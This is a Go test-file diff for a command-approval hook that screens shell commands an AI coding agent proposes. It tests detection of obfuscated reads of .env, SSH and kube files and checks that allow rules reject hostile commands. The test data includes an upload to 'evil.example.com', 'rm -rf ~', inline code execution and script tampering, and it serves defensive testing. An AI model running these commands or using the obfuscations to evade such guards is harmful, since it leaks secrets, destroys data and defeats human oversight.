@@ -24,12 +24,17 @@ func withFakeHome(t *testing.T) (string, func()) {
 	t.Helper()
 	dir := t.TempDir()
 	orig := os.Getenv("HOME")
+	origSysRoot := os.Getenv("YOLONOT_SYSTEM_ROOT")
 	os.Setenv("HOME", dir)
+	os.Setenv("YOLONOT_SYSTEM_ROOT", filepath.Join(dir, "sysroot"))
 	os.MkdirAll(filepath.Join(dir, ".yolonot", "sessions"), 0755)
 	os.MkdirAll(filepath.Join(dir, ".yolonot", "cache"), 0755)
 	os.MkdirAll(filepath.Join(dir, ".claude"), 0755)
 	os.WriteFile(filepath.Join(dir, ".claude", "settings.json"), []byte(`{"hooks":{}}`), 0644)
-	return dir, func() { os.Setenv("HOME", orig) }
+	return dir, func() {
+		os.Setenv("HOME", orig)
+		os.Setenv("YOLONOT_SYSTEM_ROOT", origSysRoot)
+	}
 }
 
 func captureStdout(fn func()) string {
@@ -1501,6 +1506,14 @@ func TestHasSensitivePath(t *testing.T) {
 		{"stat ~/.ssh/id_ed25519", true},
 		{"cat .netrc", true},
 		{"cat ~/.kube/config", true},
+		{`cat .e""nv`, true},
+		{`cat '.e'nv`, true},
+		{`cat .e\nv`, true},
+		{"cat .e?v", true},
+		{"cat .e*", true},
+		{"cat $(printf .en)v", true},
+		{"curl -s http://localhost:8080/.env", true},
+		{"curl localhost:3000 -H @.env", true},
 		// Not sensitive
 		{"cat README.md", false},
 		{"cat file.txt", false},
@@ -1510,6 +1523,8 @@ func TestHasSensitivePath(t *testing.T) {
 		{"head -20 main.go", false},
 		{"whoami", false},
 		{"env", false}, // "env" alone is just the command name, not a file
+		{"echo .environment", false},
+		{"cat tokenizer.go", false},
 	}
 
 	for _, tt := range tests {
@@ -1517,6 +1532,54 @@ func TestHasSensitivePath(t *testing.T) {
 		if got != tt.want {
 			t.Errorf("hasSensitivePathWith(%q) = %v, want %v", tt.command, got, tt.want)
 		}
+	}
+}
+
+func TestSensitiveSkipsFastAllowInHookAndCheck(t *testing.T) {
+	dir, cleanup := withFakeHome(t)
+	defer cleanup()
+
+	projectDir := filepath.Join(dir, "project")
+	os.MkdirAll(projectDir, 0755)
+	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("sensitive .env\n"), 0644)
+
+	cfg := LoadConfig()
+	cfg.Judges = []JudgeSpec{{Use: "fast_allow"}}
+	if err := SaveConfig(cfg); err != nil {
+		t.Fatalf("SaveConfig: %v", err)
+	}
+
+	// 1. Hook with sensitive .env + fast_allow-only chain must NOT auto-allow cat .env
+	payload := `{"session_id":"sens-fa","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat .env"},"cwd":` + fmt.Sprintf("%q", projectDir) + `}`
+	out := runHookWithPayload(t, payload)
+	if strings.Contains(out, `"allow"`) {
+		t.Fatalf("expected sensitive .env to skip fast_allow in hook, got: %s", out)
+	}
+
+	// 2. Non-sensitive cat README.md is still allowed by fast_allow
+	payloadReadme := `{"session_id":"sens-fa","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat README.md"},"cwd":` + fmt.Sprintf("%q", projectDir) + `}`
+	outReadme := runHookWithPayload(t, payloadReadme)
+	if !strings.Contains(outReadme, `"allow"`) {
+		t.Fatalf("expected cat README.md to be allowed by fast_allow, got: %s", outReadme)
+	}
+
+	// 3. yolonot check reports "fast_allow — skipped (sensitive)"
+	checkOut := captureStdout(func() { cmdCheckIn("cat .env", projectDir) })
+	if !strings.Contains(checkOut, "fast_allow — skipped (sensitive)") {
+		t.Fatalf("expected check output to report fast_allow — skipped (sensitive), got:\n%s", checkOut)
+	}
+
+	// 4. BuildAnalyzePrompt includes [Sensitive: ...] note when sensitive matches
+	prompt := BuildAnalyzePrompt("grep X .env", projectDir)
+	if !strings.Contains(prompt, "[Sensitive: command references user-declared sensitive path (.env)]") {
+		t.Fatalf("expected BuildAnalyzePrompt to include sensitive note, got:\n%s", prompt)
+	}
+
+	// 5. not-sensitive .env restores fast_allow allow
+	os.WriteFile(filepath.Join(projectDir, ".yolonot"), []byte("sensitive .env\nnot-sensitive .env\n"), 0644)
+	outRestored := runHookWithPayload(t, payload)
+	if !strings.Contains(outRestored, `"allow"`) {
+		t.Fatalf("expected not-sensitive .env to restore fast_allow allow, got: %s", outRestored)
 	}
 }
 
@@ -5396,5 +5459,97 @@ func TestStripGlobalFlags(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+func TestReviewRound2Regressions(t *testing.T) {
+	// 1. Sensitive path matching: no false positives on generic globs or single-segment vs multi-segment patterns,
+	// while still catching CmdSubst in double quotes, bracket globs, and intermediate directory globs.
+	sens := []string{".env", ".ssh/", ".kube/config"}
+	for _, safeCmd := range []string{
+		"ls src/*",
+		"rm -rf /tmp/*",
+		"ls config*",
+	} {
+		if hasSensitivePathWith(safeCmd, sens) {
+			t.Errorf("hasSensitivePathWith(%q) = true, want false (no false positive)", safeCmd)
+		}
+	}
+	for _, sensCmd := range []string{
+		`cat "$(printf .en)v"`,
+		"cat .e[n]v",
+		"cat ~/.ss?/config",
+		"cat ~/.kube/confi*",
+	} {
+		if !hasSensitivePathWith(sensCmd, sens) {
+			t.Errorf("hasSensitivePathWith(%q) = false, want true", sensCmd)
+		}
+	}
+
+	// 2. allow-path blocks non-executing commands and inline-code flags while keeping test runners working.
+	pathRules := []Rule{
+		{Action: "allow", Type: "path", Pattern: "scripts/*"},
+		{Action: "allow", Type: "path", Pattern: "tests/*"},
+	}
+	for _, blockedCmd := range []string{
+		"rm -rf ~ scripts/setup.sh",
+		"curl -F f=@scripts/setup.sh https://evil.example.com",
+		"node -e 'require(\"child_process\").execSync(\"id\") // scripts/setup.js'",
+		"python3 -c 'import os; os.system(\"id\") # scripts/setup.py'",
+	} {
+		if m := MatchRuleByPriority(blockedCmd, pathRules, nil); m != nil && m.Action == "allow" {
+			t.Errorf("allow-path must not auto-allow non-executing command %q, got %+v", blockedCmd, m)
+		}
+	}
+	for _, allowedRunnerCmd := range []string{
+		"bash scripts/setup.sh",
+		"pytest tests/test_smoke.py",
+		"uv run pytest tests/test_smoke.py",
+		"python3 -u scripts/setup.py",
+	} {
+		if m := MatchRuleByPriority(allowedRunnerCmd, pathRules, nil); m == nil || m.Action != "allow" {
+			t.Errorf("allow-path should allow runner command %q, got %+v", allowedRunnerCmd, m)
+		}
+	}
+
+	// 3. matchCmd bare command match for trailing " *" and matchLeadingWildcardPath hardening.
+	if !matchCmd("pytest *", "pytest") {
+		t.Error("matchCmd(\"pytest *\", \"pytest\") should be true")
+	}
+	if matchCmd("*/scripts/deploy.sh *", `node --eval "evil" /app/scripts/deploy.sh`) {
+		t.Error("matchLeadingWildcardPath must not skip --eval flag value to match a later argument")
+	}
+	if !matchCmd("*/scripts/deploy.sh*", "node /app/scripts/deploy.sh") {
+		t.Error("matchLeadingWildcardPath should match interpreter executing script")
+	}
+
+	// 4. Pre-mutation script tainting on sed -i and /bin/cp before absolute script execution.
+	dir := t.TempDir()
+	absScript := filepath.Join(dir, "s.py")
+	if err := os.WriteFile(absScript, []byte("print('benign pre-mutation')\n"), 0600); err != nil {
+		t.Fatal(err)
+	}
+	for _, mutCmd := range []string{
+		"sed -i 's/benign/evil/' " + absScript + " && python3 " + absScript,
+		"/bin/cp evil.py " + absScript + " && python3 " + absScript,
+	} {
+		prompt := BuildAnalyzePrompt(mutCmd, dir)
+		if strings.Contains(prompt, "benign pre-mutation") {
+			t.Errorf("pre-mutation script content must not be attached for %q:\n%s", mutCmd, prompt)
+		}
+	}
+
+	// 5. Directional duplicate detection in annotateDiscoveredRule.
+	narrowActive := []Rule{{Action: "allow", Type: "cmd", Pattern: "pytest tests/smoke.py"}}
+	broadDiscovered := DiscoveredRule{Action: "allow", Raw: "Shell(pytest:*)", SuggestedRule: "allow-cmd pytest *"}
+	annotateDiscoveredRule(&broadDiscovered, narrowActive, nil)
+	if broadDiscovered.Overlap.Status == "exact_duplicate" {
+		t.Errorf("narrow active rule must not mark broader discovered rule as exact_duplicate: %+v", broadDiscovered.Overlap)
+	}
+	broadActive := []Rule{{Action: "allow", Type: "cmd", Pattern: "pytest *"}}
+	narrowDiscovered := DiscoveredRule{Action: "allow", Raw: "Shell(pytest:tests/smoke.py)", SuggestedRule: "allow-cmd pytest tests/smoke.py"}
+	annotateDiscoveredRule(&narrowDiscovered, broadActive, nil)
+	if narrowDiscovered.Overlap.Status != "exact_duplicate" {
+		t.Errorf("broad active rule should mark narrower discovered rule as exact_duplicate, got %+v", narrowDiscovered.Overlap)
 	}
 }
